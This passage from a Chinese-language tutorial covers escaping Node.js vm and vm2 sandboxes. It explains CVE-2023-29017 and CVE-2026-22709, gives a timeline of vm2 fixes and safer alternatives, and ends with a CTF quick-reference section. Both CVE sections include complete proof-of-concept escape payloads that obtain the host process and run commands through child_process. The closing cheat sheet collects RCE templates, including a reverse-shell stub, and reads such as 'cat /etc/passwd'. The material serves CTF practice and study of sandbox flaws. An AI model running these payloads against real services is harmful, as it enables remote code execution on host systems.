### 3.2.4 CVE-2023-29017：frames 未代理（≤ 3.9.14）

**安装**：`npm install vm2@3.9.14`（推荐 Node.js v18.16.0 左右）

#### 3.2.4.1 漏洞原理与 6.3 的区别

CVE-2022-36067 的修复方案是：把所有 Error 相关的操作都换成 `localError`（vm2 内部维护的安全版），让攻击者覆盖的 `prepareStackTrace` 影响不到 vm2 自己的 Error 处理。

但这个修复漏掉了一个细节：V8 在调用 `prepareStackTrace` 时，传入的 `frames`（`structuredStackTrace`）数组**本身没有经过 vm2 的 Proxy 代理**——它是 V8 引擎直接构造并传进来的裸对象，vm2 没有机会拦截。

因此，攻击者不需要操作 Error 对象本身，只需要拦截 `prepareStackTrace` 的参数，就能拿到这个未经代理的宿主级 frames 数组，进而沿 `constructor` 链逃逸。

#### 3.2.4.2 为何此漏洞终结了 vm2

这个漏洞暴露了 vm2 防御体系的根本性问题：V8 引擎内部传递的对象，vm2 没有能力全部代理到。只要 V8 在某个底层回调中漏掉一个未被 Proxy 包裹的宿主对象，整个防线就崩了。

这是架构层面的缺陷，不是修一个补丁能解决的。vm2 的作者在分析此漏洞后，于 2023 年 7 月宣布放弃维护。

#### 3.2.4.3 完整 POC

```javascript
const { VM } = require('vm2');

const payload = `
    const err = new Error();
    err.name = {
        toString: new Proxy(() => '', {
            apply(target, thiz, args) {
                // args 是 V8 传来的 frames 数组，未经 Proxy 代理
                // args.constructor 就是宿主的 Array 构造函数
                // args.constructor.constructor 就是宿主的 Function
                const hostProcess =
                    args.constructor.constructor('return process')();
                hostProcess.mainModule.require('child_process')
                    .execSync('whoami');
                return 'Pwned!';
            }
        })
    };

    // 访问 err.stack 触发 prepareStackTrace，
    // V8 在格式化时会对 err.name 调用 toString
    try { err.stack; } catch(e) {}
`;

new VM().run(payload);
```
---
### 3.2.5 CVE-2026-22709：globalPromise 劫持（≤ 3.10.1）

**安装**：`npm install vm2@3.10.0`

#### 3.2.5.1 漏洞原理：async/await 的底层 Promise

JavaScript 的 `async` 函数在底层使用的是 `Promise`，但有一个细节：它用的是**全局的 Promise**（`globalPromise`），不是你在代码里通过变量名引用的 `Promise`。

vm2 对 Promise 做了沙箱处理，创建了 `localPromise`，用它替换沙箱内代码能访问到的 `Promise` 变量。vm2 对 `localPromise.prototype.then` 的回调进行了严格过滤。

但问题在于：`async` 函数返回的 Promise，用的是 `globalPromise`（V8 底层的），不是 vm2 替换的 `localPromise`。vm2 过滤了 `localPromise` 的 `then` 和 `catch`，但**没有处理 `globalPromise` 的 `catch`**。

#### 3.2.5.2 localPromise 与 globalPromise 的区别

```javascript
// vm2 能控制的：
const p1 = new Promise(...);     // 用的是 vm2 替换过的 localPromise
p1.then(...)                     // vm2 对这里的回调做了过滤

// vm2 无法控制的：
async function foo() { ... }
const p2 = foo();                // 底层用的是 globalPromise，vm2 没有代理
p2.catch(...)                    // globalPromise 的 catch，vm2 没有过滤！
```

#### 3.2.5.3 完整 POC

```javascript
const { VM } = require('vm2');

const payload = `
    let hostProcess;

    // 第一步：重写 Function.prototype.call，拦截所有 call 调用
    const originalCall = Function.prototype.call;
    Function.prototype.call = function(...args) {
        const target = args[1]; // catch 回调的第一个参数是 error 对象
        if (target && target.constructor &&
            target.constructor.name === 'Error') {
            try {
                // 这个 Error 对象是宿主的，constructor 链可以爬出去
                hostProcess =
                    target.constructor.constructor('return process')();
            } catch(e) {}
        }
        return originalCall.apply(this, args);
    };

    // 第二步：构造 async 函数，让它抛出 Error
    async function trigger() {
        throw new Error('sandbox_bypass');
    }

    // 第三步：用 catch 接收异常
    // catch 回调经由 globalPromise 处理，没有被 vm2 过滤
    // 最终会调用 Function.prototype.call，触发我们的拦截器
    trigger().catch(err => {});

    // 第四步：此时 hostProcess 已经被赋值，执行命令
    if (hostProcess) {
        hostProcess.mainModule.require('child_process')
            .execSync('whoami');
    }
`;

new VM().run(payload);
```
---
## 3.3 vm2 漏洞时间线与现状

### 3.3.1 各版本修复历史

| 时间 | CVE | 影响版本 | 漏洞类型 | 修复版本 |
|---|---|---|---|---|
| 2019 | CVE-2019-10761 | ≤ 3.6.10 | 调用栈溢出逃逸 | 3.6.11 |
| 2021 | CVE-2021-23449 | ≤ 3.9.4 | 动态 import() 语法逃逸 | 3.9.5 |
| 2022 | CVE-2022-36067 | ≤ 3.9.10 | prepareStackTrace 覆盖 | 3.9.11 |
| 2023.04 | CVE-2023-29017 | ≤ 3.9.14 | frames 未代理 | 无修复 |
| 2023.07 | — | 全版本 | **官方宣布停止维护** | — |
| 2026 | CVE-2026-22709 | ≤ 3.10.1 | globalPromise 劫持 | 3.10.2 |
### 3.3.2 vm2 宣布停止维护的始末

2023 年 4 月，安全研究员发布了 CVE-2023-29017，指出 vm2 存在由 V8 底层行为导致的根本性逃逸路径。作者分析后意识到这类问题在现有架构下无法彻底修复——只要 V8 还会在某些底层回调中传递未代理的宿主对象，就永远会有新的逃逸路径。

2023 年 7 月，vm2 仓库发布最终公告，宣布放弃维护。公告原文的核心意思是：这个问题超出了我们能在 JavaScript 层面修复的范围，建议用户迁移到其他方案。

截至公告发布，npm 上 vm2 的周下载量仍有数百万次，大量项目受到影响。

### 3.3.3 目前的替代方案

| 方案 | 类型 | 隔离强度 | 说明 |
|---|---|---|---|
| `isolated-vm` | Node.js 插件 | 强 | 基于 V8 Isolate，真正的隔离，推荐 |
| `vm-browserify` | 纯 JS | 弱 | 只适合浏览器端，不做安全隔离 |
| Docker 容器 | 系统级 | 最强 | 最彻底的隔离，但开销大 |
| Deno | 运行时 | 强 | 原生沙箱设计，权限模型更完善 |
| WebAssembly | 运行时 | 中 | 适合特定计算场景 |

对于真正需要执行不可信代码的场景，目前最推荐的是 `isolated-vm`——它基于 V8 的原生 Isolate 机制，每个沙箱是一个真正独立的 V8 实例，根本没有共享原型链的问题。

---
# 4 CTF 实战速查

## 4.1 遇到沙箱题的判断流程
```
1. 确认沙箱类型
   → 查看 package.json 的 dependencies
   → 搜索代码中的 require('vm') 或 require('vm2')

2. 确认库版本
   → npm ls vm2
   → 或查看 package-lock.json

3. 对照漏洞版本表（见 8.3）
   → 选择对应的 CVE POC

4. 分析注入点
   → 用户输入如何传入 vm.run() / vm.runInContext()?
   → 传入的是什么？是字符串？还是对象？

5. 分析宿主对返回值的处理
   → 有没有字符串拼接？→ 可以用 toString 技巧
   → 有没有属性访问？→ 可以用 Proxy 技巧
   → 只是 try/catch？→ 用 throw Proxy
```

## 4.2 vm 与 vm2 逃逸方式选择思路
```
原生 vm
  ├─ sandbox 有非空对象属性？
  │    → 用 this.constructor.constructor('return process')()
  ├─ sandbox 是 Object.create(null)？
  │    ├─ 宿主对返回值做字符串拼接？→ toString 重写
  │    ├─ 宿主访问返回值属性？→ Proxy get
  │    └─ 其他情况？→ throw Proxy（最通用）

vm2
  ├─ 版本 ≤ 3.6.10 → CVE-2019-10761（调用栈溢出）
  ├─ 版本 ≤ 3.9.4  → CVE-2021-23449（动态 import）
  ├─ 版本 ≤ 3.9.10 → CVE-2022-36067（prepareStackTrace）
  ├─ 版本 ≤ 3.9.14 → CVE-2023-29017（frames 未代理）
  └─ 版本 ≤ 3.10.1 → CVE-2026-22709（globalPromise）
```

## 4.3 版本与可用漏洞对照表

|目标环境|利用技术|安装命令|Node.js 版本|
|---|---|---|---|
|原生 vm（任意）|this.constructor 原型链|—|任意|
|原生 vm + Object.create(null)|callee.caller + Proxy|—|任意|
|vm2 ≤ 3.6.10|CVE-2019-10761|`npm i vm2@3.6.10`|12/14|
|vm2 ≤ 3.9.4|CVE-2021-23449|`npm i vm2@3.9.3`|14|
|vm2 ≤ 3.9.10|CVE-2022-36067|`npm i vm2@3.9.10`|任意|
|vm2 ≤ 3.9.14|CVE-2023-29017|`npm i vm2@3.9.14`|18|
|vm2 ≤ 3.10.1|CVE-2026-22709|`npm i vm2@3.10.0`|20+|

## 4.4 通用 RCE Payload 模板速查

```javascript
// ① 原生 vm 基础逃逸（sandbox 有对象属性）
const p = this.constructor.constructor('return process')();
p.mainModule.require('child_process').execSync('id').toString();

// ② Object.create(null) 场景：throw Proxy 逃逸
throw new Proxy({}, {
    get: function() {
        const cc = arguments.callee.caller;
        const p = cc.constructor.constructor('return process')();
        return p.mainModule.require('child_process').execSync('id').toString();
    }
});
// 宿主需要有 catch(e) { ... + e } 或类似字符串拼接操作

// ③ 拿到 process 后的 RCE 方式
process.mainModule.require('child_process').execSync('id').toString()   // 同步，有回显
process.mainModule.require('child_process').exec('bash -i ...')        // 异步，反弹 shell
process.mainModule.require('child_process').spawnSync('ls', ['/'])     // 带参数

// ④ 常用命令
// Linux:   'id', 'whoami', 'cat /flag', 'cat /etc/passwd', 'ls /'
// Windows: 'whoami', 'dir C:\\'，'type C:\\flag.txt'
```
